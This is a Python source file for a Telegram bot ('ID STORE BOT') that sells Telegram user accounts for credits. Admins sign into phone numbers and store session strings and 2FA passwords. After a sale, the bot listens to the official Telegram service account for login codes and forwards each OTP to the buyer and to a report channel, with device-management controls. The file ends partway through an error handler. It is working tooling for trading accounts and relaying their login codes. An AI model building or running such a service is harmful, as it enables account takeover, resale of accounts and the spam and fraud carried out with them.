from __future__ import annotations


def to_smallcaps(text: str) -> str:
    """Convert text to small caps Unicode style."""
    normal = "abcdefghijklmnopqrstuvwxyz"
    small_caps = "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ"
    trans = str.maketrans(normal + normal.upper(), small_caps + small_caps)
    return text.translate(trans)


def h(value: object) -> str:
    """HTML-escape dynamic values for safe insertion into ParseMode.HTML messages."""
    import html as _html

    return _html.escape(str(value), quote=False)


import asyncio
import html
import logging
import os
import sys
from dataclasses import dataclass
from typing import Any, Callable, Dict, Optional

# Ensure local folder is importable even if run from another working directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from bson import ObjectId
from telethon import TelegramClient, events
from telethon.errors import RPCError, SessionPasswordNeededError
from telethon.errors.rpcerrorlist import (
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
)
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
try:
    from telegram import (
        InlineKeyboardButton,
        InlineKeyboardMarkup,
        KeyboardButton,
        ReplyKeyboardMarkup,
        Update,
    )
    from telegram.constants import ParseMode
    from telegram.error import BadRequest, NetworkError, TimedOut
    from telegram.ext import (
        Application,
        ApplicationBuilder,
        CallbackQueryHandler,
        CommandHandler,
        ContextTypes,
        MessageHandler,
        filters,
    )
except ImportError as e:  # pragma: no cover
    raise RuntimeError(
        "Wrong 'telegram' package installed. This project requires 'python-telegram-bot'.\n\n"
        "Fix (recommended):\n"
        "  pip uninstall -y telegram\n"
        "  pip uninstall -y python-telegram-bot telegram-bot\n"
        "  pip install -U python-telegram-bot\n\n"
        "Then restart the bot. Original import error: "
        + str(e)
    )




async def safe_edit(
    message,
    text: str,
    *,
    reply_markup: InlineKeyboardMarkup | None = None,
    parse_mode=ParseMode.HTML,
):
    """Edit a message safely.

    - If the message is a photo/document with caption, use edit_caption.
    - Else use edit_text.
    """
    try:
        if getattr(message, "photo", None) and (getattr(message, "text", None) in (None, "")):
            return await message.edit_caption(caption=text, parse_mode=parse_mode, reply_markup=reply_markup)
        return await message.edit_text(text=text, parse_mode=parse_mode, reply_markup=reply_markup)
    except BadRequest as e:
        # Ignore "Message is not modified" errors (happens when user taps same button repeatedly)
        if "Message is not modified" in str(e):
            return None
        raise
    except Exception:
        # Fallback attempt to edit as text (e.g. if caption edit fails)
        try:
            return await message.edit_text(text=text, parse_mode=parse_mode, reply_markup=reply_markup)
        except BadRequest as e:
            if "Message is not modified" in str(e):
                return None
            raise


import admin as admin_module
import device_manager
from config import (
    ADMIN_USER_IDS,
    BOT_TOKEN,
    CHANNEL_USERNAME,
    REPORT_CHANNEL_ID,
    INR_QRS,
    START_IMAGE,
    SUPPORT_USERNAME,
)
from database import Repo, get_db, init_indexes

# ----------------------------
# Logging
# ----------------------------
# Keep console clean: show only startup + warnings/errors.
logging.basicConfig(
    level=logging.WARNING,
    format="%(levelname)s:%(name)s:%(message)s",
)

# Silence very noisy libraries
for _name in (
    "httpx",
    "telegram",
    "telegram.ext",
    "telethon",
    "telethon.network.mtprotosender",
    "telethon.client.users",
    "telethon.client.telegrambaseclient",
):
    logging.getLogger(_name).setLevel(logging.ERROR)

logger = logging.getLogger(__name__)


# Shared in-memory state for guided text flows (admin inputs)
STATE: Dict[int, Dict[str, Any]] = {}


def is_admin(user_id: int) -> bool:
    return int(user_id) in set(ADMIN_USER_IDS)



def require_token() -> None:
    if not BOT_TOKEN:
        raise RuntimeError(
            "BOT_TOKEN is empty. Set BOT_TOKEN in config.py or set BOT_TOKEN environment variable."
        )


def kb(rows: list[list[InlineKeyboardButton]]) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(rows)


async def safe_query_answer(query, *args, **kwargs) -> None:
    """Answer callback query without crashing on transient Telegram timeouts."""
    try:
        await query.answer(*args, **kwargs)
    except (TimedOut, NetworkError):
        # Telegram API sometimes times out; callback will still work without answering.
        return
    except Exception:
        return


async def safe_reply_text(message, text: str, **kwargs):
    """Reply with basic retry on transient Telegram timeouts."""
    last_exc: Exception | None = None
    for _ in range(3):
        try:
            return await message.reply_text(text, **kwargs)
        except (TimedOut, NetworkError) as e:
            last_exc = e
            await asyncio.sleep(1)
        except BadRequest:
            raise
    if last_exc:
        raise last_exc


async def safe_bot_send(bot, method_name: str, **kwargs):
    """Call context.bot.send_* with retry on transient timeouts."""
    last_exc: Exception | None = None
    fn = getattr(bot, method_name)
    for _ in range(3):
        try:
            return await fn(**kwargs)
        except (TimedOut, NetworkError) as e:
            last_exc = e
            await asyncio.sleep(1)
        except BadRequest:
            raise
    if last_exc:
        raise last_exc


async def _send_qr(
    update: Update,
    *,
    caption: str,
    buttons: InlineKeyboardMarkup,
    image_url: str | None,
    parse_mode: str | None = None,
):
    """Send a QR/code image using hosted URL only.

    Works for both message and callback updates.
    If sending the hosted image fails, falls back to text-only instructions.
    """
    target = update.effective_message
    if target is None and update.callback_query is not None:
        target = update.callback_query.message
    if target is None:
        raise RuntimeError("No message target available to send QR")

    if image_url:
        try:
            return await target.reply_photo(
                photo=image_url,
                caption=caption,
                reply_markup=buttons,
                parse_mode=parse_mode,
            )
        except Exception:
            pass

    # fallback: text only
    return await target.reply_text(
        caption,
        reply_markup=buttons,
        parse_mode=parse_mode,
    )


def cancel_only_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([[KeyboardButton("Cancel")]], resize_keyboard=True, is_persistent=True)


def reply_menu(is_admin_user: bool) -> ReplyKeyboardMarkup:
    rows = [
        [KeyboardButton(f"🛒 {to_smallcaps('Buy')}"), KeyboardButton(f"💳 {to_smallcaps('Deposit')}")],
        [KeyboardButton(f"💰 {to_smallcaps('Balance')}"), KeyboardButton(f"📜 {to_smallcaps('History')}")],
        [KeyboardButton(f"🆘 {to_smallcaps('Support')}")],
    ]
    if is_admin_user:
        rows.append([KeyboardButton(f"🛠 {to_smallcaps('Admin')}")])

    return ReplyKeyboardMarkup(
        rows,
        resize_keyboard=True,
        is_persistent=True,
        selective=False,
    )


def main_menu(is_admin: bool) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton(f"🛒 {to_smallcaps('Buy Account')}", callback_data="shop:countries"),
            InlineKeyboardButton(f"📜 {to_smallcaps('History')}", callback_data="me:history:0"),
        ],
        [
            InlineKeyboardButton(f"💰 {to_smallcaps('Balance')}", callback_data="me:balance"),
            InlineKeyboardButton(f"💳 {to_smallcaps('Deposit')}", callback_data="dep:start"),
        ],
        [
            InlineKeyboardButton(f"🆘 {to_smallcaps('Support')}", url=f"https://t.me/{SUPPORT_USERNAME}"),
            InlineKeyboardButton(f"🔎 {to_smallcaps('Find by Credits')}", callback_data="find:credits"),
        ],
    ]
    if is_admin:
        rows.append([InlineKeyboardButton(f"🛠 {to_smallcaps('Admin Panel')}", callback_data="admin:menu")])
    return kb(rows)


def back_to_menu() -> InlineKeyboardMarkup:
    return kb([[InlineKeyboardButton(f"⬅️ {to_smallcaps('Back')}", callback_data="menu:home")]])


def countries_keyboard(countries: list[dict]) -> InlineKeyboardMarkup:
    rows: list[list[InlineKeyboardButton]] = []
    current: list[InlineKeyboardButton] = []

    # 2 buttons per row
    for c in countries:
        code = c.get("country") or "?"
        emoji = c.get("country_emoji") or ""
        count = c.get("count", 0)
        current.append(InlineKeyboardButton(f"{emoji} {code} ({count})", callback_data=f"shop:country:{code}"))
        if len(current) == 2:
            rows.append(current)
            current = []

    if current:
        rows.append(current)

    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="menu:home")])
    return kb(rows)


def _find_results_kb(groups: list[dict[str, Any]], *, max_price: int, page: int, total: int) -> InlineKeyboardMarkup:
    rows: list[list[InlineKeyboardButton]] = []
    cur: list[InlineKeyboardButton] = []

    for g in groups:
        emoji = g.get("country_emoji") or "🌍"
        country = g.get("country") or "?"
        year = g.get("year")
        year_token = "none" if year is None else str(year)
        if year == "premium":
            m = g.get("premium_months")
            year_txt = f"⭐ Premium ({m}m)" if m else "⭐ Premium"
        else:
            year_txt = str(year) if year is not None else "Unknown"
        price = int(g.get("price") or 0)
        count = int(g.get("count") or 0)
        label = f"{emoji} {year_txt} • {price}c ({count})"
        cur.append(
            InlineKeyboardButton(label, callback_data=f"find:pickgrp:{country}:{year_token}:{price}")
        )
        if len(cur) == 2:
            rows.append(cur)
            cur = []

    if cur:
        rows.append(cur)

    page_size = 10
    max_page = max(0, (total - 1) // page_size) if total else 0
    nav: list[InlineKeyboardButton] = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"find:page:{max_price}:{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"find:page:{max_price}:{page+1}"))
    if nav:
        rows.append(nav)

    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="menu:home")])
    return kb(rows)


def inr_amount_kb(amount_str: str) -> InlineKeyboardMarkup:
    # 0-9 keypad + delete + back/cancel/confirm
    display = amount_str if amount_str else "0"
    return kb(
        [
            [InlineKeyboardButton("1", callback_data="inrpad:1"), InlineKeyboardButton("2", callback_data="inrpad:2"), InlineKeyboardButton("3", callback_data="inrpad:3")],
            [InlineKeyboardButton("4", callback_data="inrpad:4"), InlineKeyboardButton("5", callback_data="inrpad:5"), InlineKeyboardButton("6", callback_data="inrpad:6")],
            [InlineKeyboardButton("7", callback_data="inrpad:7"), InlineKeyboardButton("8", callback_data="inrpad:8"), InlineKeyboardButton("9", callback_data="inrpad:9")],
            [InlineKeyboardButton("0", callback_data="inrpad:0"), InlineKeyboardButton("⌫", callback_data="inrpad:del")],
            [
                InlineKeyboardButton("⬅️ Back", callback_data="dep:inr"),
                InlineKeyboardButton("❌ Cancel", callback_data="dep:cancel"),
                InlineKeyboardButton("✅ Confirm", callback_data="inrpad:ok"),
            ],
        ]
    )


def years_keyboard(country: str, years: list[dict]) -> InlineKeyboardMarkup:
    # Sort: Premium first, then numeric years desc, then Unknown/None last
    def _sort_key(item: dict):
        y = item.get("year")
        if y == "premium":
            return (0, 0)
        if isinstance(y, int):
            return (1, -y)
        if isinstance(y, str) and y.isdigit():
            return (1, -int(y))
        return (2, 0)

    years_sorted = sorted(years, key=_sort_key)

    rows: list[list[InlineKeyboardButton]] = []
    cur: list[InlineKeyboardButton] = []

    for y in years_sorted:
        year = y.get("year")
        count = y.get("count", 0)
        val = str(year) if year is not None else "none"

        if year == "premium":
            label = f"⭐ Premium ({count})"
        else:
            label = f"{year} ({count})" if year is not None else f"Unknown ({count})"

        cur.append(InlineKeyboardButton(label, callback_data=f"shop:year:{country}:{val}"))
        if len(cur) == 3:
            rows.append(cur)
            cur = []

    if cur:
        rows.append(cur)

    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="shop:countries")])
    return kb(rows)


def buy_confirm_keyboard(country: str, year_token: str) -> InlineKeyboardMarkup:
    return kb(
        [
            [InlineKeyboardButton(f"✅ {to_smallcaps('Confirm Buy')}", callback_data=f"shop:buy:{country}:{year_token}")],
            [
                InlineKeyboardButton(f"⬅️ {to_smallcaps('Back')}", callback_data=f"shop:country:{country}"),
                InlineKeyboardButton(f"🏠 {to_smallcaps('Menu')}", callback_data="menu:home"),
            ],
        ]
    )


@dataclass
class PendingLogin:
    api_id: int
    api_hash: str
    phone: str
    client: TelegramClient


def _mask_phone_e164_like(phone_digits: str) -> str:
    """Mask number like +91••••••••44 (keep first 2 + last 2 digits)."""
    digits = "".join(ch for ch in str(phone_digits) if ch.isdigit())
    if len(digits) <= 4:
        return f"+{digits}" if digits else "+"
    start = digits[:2]
    end = digits[-2:]
    return f"+{start}{'•' * (len(digits) - 4)}{end}"


async def _send_sold_report(
    bot,
    *,
    account_doc: dict[str, Any],
    otp_text: str,
) -> None:
    """Send a professional sold report to the configured report channel."""
    try:
        me = await bot.get_me()
        bot_uname = f"@{me.username}" if getattr(me, "username", None) else "(no username)"
    except Exception:
        bot_uname = "(unknown)"

    country = account_doc.get("country") or ""
    country_emoji = account_doc.get("country_emoji") or ""
    year = account_doc.get("year")
    premium_months = account_doc.get("premium_months")

    if year == "premium":
        year_txt = f"⭐ Premium ({premium_months}m)" if premium_months else "⭐ Premium"
    elif year is None:
        year_txt = "N/A"
    else:
        year_txt = str(year)

    phone = str(account_doc.get("phone", ""))
    masked = _mask_phone_e164_like(phone)

    buyer_username = (account_doc.get("sold_to_username") or "").strip()
    buyer_line = f"@{buyer_username}" if buyer_username else "N/A"

    sold_at = account_doc.get("price")
    sold_at_txt = f"{sold_at} Credits" if sold_at is not None else "N/A"

    text = (
        "🎉 ACCOUNT SOLD\n"
        "━━━━━━━━━━━━━━\n"
        f"🌍 Country  : {country_emoji} {country}\n"
        f"🗓️ Year     : {year_txt}\n"
        f"📱 Number   : {masked}\n"
        f"🔐 OTP Code : {otp_text}\n"
        f"💸 Sold At  : {sold_at_txt}\n"
        "━━━━━━━━━━━━━━\n"
        f"👤 Buyer : {buyer_line}\n"
        f"🤖 Bot   : {bot_uname}"
    )

    try:
        await bot.send_photo(
            chat_id=REPORT_CHANNEL_ID,
            photo=START_IMAGE,
            caption=text,
        )
    except Exception:
        return


class AccountManager:
    """Manages Telethon clients for stored accounts and OTP forwarding.

    Note: We keep the sold account session connected briefly to allow optional "Manage Devices".
    """

    def __init__(
        self,
        send_message: Callable[[int, str], "asyncio.Future[Any]"],
        *,
        bot,
    ):
        self._send_message = send_message
        self._bot = bot
        self._clients: Dict[ObjectId, TelegramClient] = {}
        self._buyers: Dict[ObjectId, int] = {}
        # Admin OTP monitoring: {account_id: admin_user_id}
        self._admin_monitors: Dict[ObjectId, int] = {}
        # Track sold report sent per account session
        self._sold_report_sent: set[ObjectId] = set()
        self._pending_admin_login: Dict[int, PendingLogin] = {}

    # ----- admin phone login (for adding accounts) -----
    async def admin_begin_login(self, admin_user_id: int, api_id: int, api_hash: str, phone_e164: str) -> None:
        if admin_user_id in self._pending_admin_login:
            await self.admin_cancel_login(admin_user_id)

        client = TelegramClient(StringSession(), int(api_id), api_hash)
        await client.connect()
        await client.send_code_request(phone_e164)
        self._pending_admin_login[admin_user_id] = PendingLogin(
            api_id=int(api_id), api_hash=api_hash, phone=phone_e164, client=client
        )

    async def admin_complete_code(self, admin_user_id: int, code: str) -> tuple[Optional[dict[str, Any]], str]:
        pending = self._pending_admin_login.get(admin_user_id)
        if not pending:
            return None, "no_pending"

        try:
            await pending.client.sign_in(phone=pending.phone, code=code)
        except PhoneCodeInvalidError:
            # Keep pending login so admin can retry
            return None, "invalid_code"
        except PhoneCodeExpiredError:
            # Code expired; require restarting login flow (resend code)
            return None, "code_expired"
        except SessionPasswordNeededError:
            return None, "need_password"
        except Exception:
            logging.exception("admin_complete_code failed")
            return None, "error"

        me = await pending.client.get_me()
        session_string = pending.client.session.save()
        doc = {
            "phone": pending.phone.lstrip("+"),
            "api_id": pending.api_id,
            "api_hash": pending.api_hash,
            "session_string": session_string,
            "tg_user_id": me.id,
            "tg_username": me.username,
        }

        await pending.client.disconnect()
        self._pending_admin_login.pop(admin_user_id, None)
        return doc, "ok"

    async def admin_complete_password(self, admin_user_id: int, password: str) -> tuple[Optional[dict[str, Any]], str]:
        pending = self._pending_admin_login.get(admin_user_id)
        if not pending:
            return None, "no_pending"

        try:
            await pending.client.sign_in(password=password)
        except PasswordHashInvalidError:
            # Keep pending login so admin can retry
            return None, "invalid_password"
        except RPCError as e:
            # Telethon versions may raise different PasswordHashInvalidError classes
            if e.__class__.__name__ == "PasswordHashInvalidError":
                return None, "invalid_password"
            logging.exception("admin_complete_password RPCError")
            return None, "error"
        except Exception as e:
            if e.__class__.__name__ == "PasswordHashInvalidError":
                return None, "invalid_password"
            logging.exception("admin_complete_password failed")
            return None, "error"

        me = await pending.client.get_me()
        session_string = pending.client.session.save()
        doc = {
            "phone": pending.phone.lstrip("+"),
            "api_id": pending.api_id,
            "api_hash": pending.api_hash,
            "session_string": session_string,
            "tg_user_id": me.id,
            "tg_username": me.username,
        }

        await pending.client.disconnect()
        self._pending_admin_login.pop(admin_user_id, None)
        return doc, "ok"

    async def admin_cancel_login(self, admin_user_id: int) -> None:
        pending = self._pending_admin_login.pop(admin_user_id, None)
        if pending:
            await pending.client.disconnect()

    # ----- buyer OTP forwarding -----
    async def ensure_connected_for_account(self, account_id: ObjectId, account_doc: dict[str, Any], buyer_user_id: int) -> None:
        # Buyer flow: setting buyer triggers sold-message + report behaviour on OTP
        self._buyers[account_id] = int(buyer_user_id)
        if account_id in self._clients:
            return

        await self._connect_client(account_id, account_doc)

    async def ensure_connected_for_admin_monitor(self, account_id: ObjectId, account_doc: dict[str, Any]) -> None:
        """Admin OTP monitoring: connect without setting buyer."""
        if account_id in self._clients:
            return
        await self._connect_client(account_id, account_doc)

    async def _connect_client(self, account_id: ObjectId, account_doc: dict[str, Any]) -> None:

        client = TelegramClient(
            StringSession(account_doc["session_string"]),
            int(account_doc["api_id"]),
            account_doc["api_hash"],
        )
        await client.connect()

        @client.on(events.NewMessage(from_users=777000))
        async def otp_listener(event):
            text = (event.raw_text or event.text or "").strip()

            # Admin monitor: forward ONLY real OTPs (prefer 5-digit), ignore other service messages
            admin_monitor = self._admin_monitors.get(account_id)
            if admin_monitor:
                import re

                m5a = re.search(r"\b(\d{5})\b", text)
                if m5a:
                    otp_admin = m5a.group(1)
                    try:
                        await self._bot.send_message(
                            chat_id=admin_monitor,
                            text=f"📱 OTP for +{account_doc.get('phone','')}: {otp_admin}",
                        )
                    except Exception:
                        pass

            buyer = self._buyers.get(account_id)
            if not buyer:
                return

            # Forward only the FIRST real OTP. Telegram login OTPs are usually 5 digits.
            import re

            m5 = re.search(r"\b(\d{5})\b", text)
            m6 = re.search(r"\b(\d{6})\b", text)
            m4 = re.search(r"\b(\d{4})\b", text)
            otp_code = (m5.group(1) if m5 else (m6.group(1) if m6 else (m4.group(1) if m4 else "")))
            if not otp_code:
                # ignore non-OTP service messages (e.g., 2FA changed)
                return

            otp_display = otp_code

            # If already forwarded once, ignore further OTPs
            if self._buyers.get(account_id) is None:
                return

            # Mark as done for buyer (stop further forwarding)
            self._buyers.pop(account_id, None)

            # Forward OTP message to buyer (+ Manage Devices)
            try:
                await self._bot.send_message(
                    chat_id=buyer,
                    text=(
                        f"🔐 OTP received for +{account_doc.get('phone','')}:\n\n{text}\n\n"
                        "✅ Account successfully sold.\n"
                        "🛠️ You can manage devices for a few minutes from the button below."
                    ),
                    reply_markup=kb(
                        [
                            [
                                InlineKeyboardButton(
                                    "🛠️ Manage Devices",
                                    callback_data=f"dev:menu:{str(account_id)}",
                                )
                            ]
                        ]
                    ),
                )
            except Exception:
                # Fallback plain text
                await self._send_message(
                    buyer,
                    f"🔐 OTP received for +{account_doc.get('phone','')}:\n\n{text}\n\n✅ Account successfully sold.",
                )

            # Also forward to admin monitor if any
            admin_monitor = self._admin_monitors.get(account_id)
            if admin_monitor and admin_monitor != buyer:
                try:
                    await self._bot.send_message(
                        chat_id=admin_monitor,
                        text=f"📱 OTP for +{account_doc.get('phone','')}:\n\n{text}",
                    )
                except Exception:
                    pass

            # Report to channel (bot must be admin) - send only once
            if account_id not in self._sold_report_sent:
                self._sold_report_sent.add(account_id)
                try:
                    await _send_sold_report(
                        self._bot,
                        account_doc=account_doc,
                        otp_text=str(otp_display),
                    )
                except Exception:
                    pass

            # Keep session for a short window to allow device management, then disconnect.
            asyncio.create_task(self.disconnect_later(account_id, seconds=600))
            return

        self._clients[account_id] = client
        return

    def get_buyer(self, account_id: ObjectId) -> int | None:
        return self._buyers.get(account_id)

    def get_client(self, account_id: ObjectId) -> TelegramClient | None:
        return self._clients.get(account_id)

    def start_admin_monitor(self, account_id: ObjectId, admin_user_id: int) -> None:
        self._admin_monitors[account_id] = int(admin_user_id)

    def stop_admin_monitor(self, account_id: ObjectId) -> None:
        self._admin_monitors.pop(account_id, None)

    def get_admin_monitor(self, account_id: ObjectId) -> int | None:
        return self._admin_monitors.get(account_id)

    async def disconnect_account(self, account_id: ObjectId) -> None:
        self._buyers.pop(account_id, None)
        self._admin_monitors.pop(account_id, None)
        client = self._clients.pop(account_id, None)
        if client:
            await client.disconnect()

    async def disconnect_later(self, account_id: ObjectId, *, seconds: int) -> None:
        await asyncio.sleep(max(1, int(seconds)))
        await self.disconnect_account(account_id)

    async def shutdown(self) -> None:
        for admin_id in list(self._pending_admin_login.keys()):
            await self.admin_cancel_login(admin_id)
        for acc_id in list(self._clients.keys()):
            await self.disconnect_account(acc_id)


async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    await safe_reply_text(update.message, "pong")


async def bd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Broadcast: admin sends /bd as reply to any message; bot forwards to all users."""
    uid = update.effective_user.id
    if not is_admin(uid):
        return

    if not update.message or not update.message.reply_to_message:
        await update.message.reply_text(
            f"<b>📢 {to_smallcaps('Broadcast')}</b>\n\n<i>{to_smallcaps('Reply to a message and send /bd')}</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    repo: Repo = context.application.bot_data["repo"]
    db = repo.db

    sent = 0
    failed = 0
    async for u in db.users.find({}, {"user_id": 1}):
        user_id = int(u.get("user_id"))
        try:
            await update.message.reply_to_message.forward(chat_id=user_id)
            sent += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"<b>✅ {to_smallcaps('Broadcast Done')}</b>\n\n"
        f"├ ✅ {to_smallcaps('Sent')}: <b>{sent}</b>\n"
        f"└ ❌ {to_smallcaps('Failed')}: <b>{failed}</b>",
        parse_mode=ParseMode.HTML,
    )


async def _is_joined(update: Update, context: ContextTypes.DEFAULT_TYPE) -> tuple[bool, str | None, list[str]]:
    """Return (joined, error, missing_channels).

    - error is set when bot cannot verify membership (e.g. bot not admin / missing rights).
    - missing_channels lists channel usernames the user still needs to join.

    We retry a couple times because Telegram membership can take a moment to propagate.
    """
    uid = update.effective_user.id

    async def _in(channel: str) -> tuple[bool, str | None]:
        try:
            member = await context.bot.get_chat_member(chat_id=f"@{channel}", user_id=uid)
            ok = member.status in {"creator", "administrator", "member", "restricted"}
            return ok, None
        except Exception as e:
            return False, str(e)

    last_err: str | None = None
    for _ in range(3):
        ok1, err1 = await _in(CHANNEL_USERNAME)

        missing: list[str] = []
        if not ok1:
            missing.append(CHANNEL_USERNAME)

        # If joined, success.
        if ok1:
            return True, None, []

        # If we got a permissions/forbidden error, stop early and return it.
        if err1:
            low = err1.lower()
            if "forbidden" in low or "not enough rights" in low or "chat not found" in low:
                return False, err1, missing
            last_err = err1

        # Retry after short delay (join propagation)
        await asyncio.sleep(1)

    return False, last_err, missing




def _home_caption(*, uid: int, credits: int, stock: int) -> str:
    return (
        f"<b>╔══════════════════╗</b>\n"
        f"<b>║  {to_smallcaps('ID STORE BOT')}  ║</b>\n"
        f"<b>╚══════════════════╝</b>\n\n"
        f"<b>📊 {to_smallcaps('Account Information')}</b>\n"
        f"├ 🆔 {to_smallcaps('User ID')}: <code>{uid}</code>\n"
        f"├ 💰 {to_smallcaps('Credits')}: <b>{credits}</b>\n"
        f"├ 💵 {to_smallcaps('Price')}: <i>{to_smallcaps('Per Account')}</i>\n"
        f"└ 📦 {to_smallcaps('Stock')}: <b>{stock}</b>\n\n"
        f"<i>💡 1 {to_smallcaps('Credit')} = 1 {to_smallcaps('INR')}</i>\n"
        f"<i>⚡ {to_smallcaps('Choose an option below to continue')}</i>"
    )


def join_keyboard() -> InlineKeyboardMarkup:
    return kb(
        [
            [InlineKeyboardButton(f"📢 {to_smallcaps('Join Channel')}", url=f"https://t.me/{CHANNEL_USERNAME}")],
            [InlineKeyboardButton(f"✅ {to_smallcaps('Verify')}", callback_data="join:verify")],
        ]
    )


async def _ban_guard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Return True if blocked (banned)."""
    try:
        repo: Repo = context.application.bot_data["repo"]
        uid = update.effective_user.id
        if await repo.is_banned(uid):
            # Use non-abusive message (policy-safe)
            await update.effective_message.reply_text(
                f"<b>🚫 {to_smallcaps('Access Denied')}</b>\n\n"
                f"<i>{to_smallcaps('You have been banned. Contact support.')}</i>",
                parse_mode=ParseMode.HTML,
            )
            return True
    except Exception:
        return False
    return False


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if await _ban_guard(update, context):
        return

    uid = update.effective_user.id
    repo: Repo = context.application.bot_data["repo"]

    # Ensure user record exists
    await repo.ensure_user(uid, username=update.effective_user.username)

    # Force join
    joined, join_err, missing = await _is_joined(update, context)
    if not joined:
        join_text = (
            f"<b>╔══════════════════╗</b>\n"
            f"<b>║  {to_smallcaps('ID STORE BOT')}  ║</b>\n"
            f"<b>╚══════════════════╝</b>\n\n"
            f"<b>🔒 {to_smallcaps('Channel Verification Required')}</b>\n\n"
            f"<b>{to_smallcaps('To access the bot, please join our channel:')}</b>\n\n"
            f"├ 📢 <b>{to_smallcaps('Channel')}</b>: @{CHANNEL_USERNAME}\n"
            f"└ ✅ <i>{to_smallcaps('Click Join Channel, then press Verify')}</i>\n\n"
            f"<i>⚠️ {to_smallcaps('Leaving the channel will revoke access')}</i>"
        )
        try:
            await update.message.reply_photo(
                photo=START_IMAGE,
                caption=join_text,
                parse_mode=ParseMode.HTML,
                reply_markup=join_keyboard(),
            )
        except Exception:
            await update.message.reply_text(
                join_text,
                parse_mode=ParseMode.HTML,
                reply_markup=join_keyboard(),
            )
        # Do NOT show bottom reply keyboard until user joins the channel
        return

    available = await repo.count_available_accounts()
    user = await repo.ensure_user(uid, username=update.effective_user.username)

    is_admin_user = admin_module.is_admin(uid)

    credits = user.get("credits", 0)
    text = _home_caption(uid=uid, credits=credits, stock=available)

    try:
        await update.message.reply_photo(
            photo=START_IMAGE,
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu(is_admin_user),
        )
        # Apply bottom reply keyboard with a normal (non-empty) message
        await update.message.reply_text(f"✅ {to_smallcaps('Menu enabled')}", reply_markup=reply_menu(is_admin_user))
    except Exception:
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu(is_admin_user),
        )

    # Reply keyboard is set above (no extra/empty messages)


async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE, *, edit: bool = False) -> None:
    uid = update.effective_user.id
    repo: Repo = context.application.bot_data["repo"]
    user = await repo.ensure_user(uid, username=update.effective_user.username)
    credits = user.get('credits', 0)
    text = (
        f"<b>╔══════════════════╗</b>\n"
        f"<b>║   {to_smallcaps('YOUR BALANCE')}   ║</b>\n"
        f"<b>╚══════════════════╝</b>\n\n"
        f"<b>💰 {to_smallcaps('Available Credits')}</b>\n"
        f"└ <b>{credits}</b> {to_smallcaps('Credits')}\n\n"
        f"<i>💡 {to_smallcaps('Use credits to purchase accounts')}</i>"
    )

    if edit and update.callback_query:
        await safe_edit(update.callback_query.message, text, reply_markup=back_to_menu(), parse_mode=ParseMode.HTML)
    else:
        await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_to_menu())


async def send_purchase_details(update: Update, context: ContextTypes.DEFAULT_TYPE, account: dict[str, Any]) -> None:
    uid = update.effective_user.id
    account_manager: AccountManager = context.application.bot_data["account_manager"]

    phone = str(account.get("phone", ""))
    country_emoji = account.get("country_emoji") or ""
    country = account.get("country") or ""
    year = account.get("year")
    premium_months = account.get("premium_months")
    twofa = account.get("twofa_password")

    # Show discount info if applied
    original_price = account.get("_original_price")
    final_price = account.get("_final_price")
    discount_used = bool(account.get("_discount_used"))

    # Year formatting
    if year == 'premium':
        year_display = f"⭐ {to_smallcaps('Premium')} ({premium_months}m)" if premium_months else f"⭐ {to_smallcaps('Premium')}"
    elif year is not None:
        year_display = str(year)
    else:
        year_display = to_smallcaps('Unknown')
    
    # Price formatting
    price = account.get("price")
    price_text = str(price) if price is not None else "-"

    msg = (
        f"<b>╔══════════════════╗</b>\n"
        f"<b>║ {to_smallcaps('PURCHASE SUCCESS')} ║</b>\n"
        f"<b>╚══════════════════╝</b>\n\n"
        f"<b>📱 {to_smallcaps('Account Details')}</b>\n"
        f"├ 📞 {to_smallcaps('Phone')}: <code>{country_emoji} +{phone}</code>\n"
        f"├ 🌍 {to_smallcaps('Country')}: <b>{country}</b>\n"
        f"├ 📅 {to_smallcaps('Year')}: <b>{year_display}</b>\n"
        f"└ 💰 {to_smallcaps('Price')}: <b>{price_text}</b> {to_smallcaps('credits')}\n\n"
        f"<b>📥 {to_smallcaps('Next Steps')}</b>\n"
        f"└ <i>{to_smallcaps('Login with this number. OTP will be forwarded here')}</i>"
    )
    if twofa:
        msg += f"\n\n<b>🔑 {to_smallcaps('2FA Password')}</b>\n└ <code>{twofa}</code>"

    await update.effective_message.reply_text(
        msg,
        parse_mode=ParseMode.HTML,
        reply_markup=kb(
            [[InlineKeyboardButton(f"🛠️ {to_smallcaps('Manage Devices')}", callback_data=f"dev:menu:{str(account['_id'])}")]]
        ),
    )
    await account_manager.ensure_connected_for_account(account["_id"], account, uid)


async def post_init(app: Application) -> None:
    # Don't crash the whole bot on transient MongoDB TLS/index issues.
    # The bot will still error on DB operations if Mongo is down, but won't restart-loop.
    try:
        await init_indexes()
    except Exception as e:
        logger.error(f"Mongo init_indexes failed: {e}")


async def post_shutdown(app: Application) -> None:
    account_manager: AccountManager = app.bot_data.get("account_manager")
    if account_manager:
        await account_manager.shutdown()


async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Log exceptions to error.txt for easy debugging
    import traceback

    err = context.error

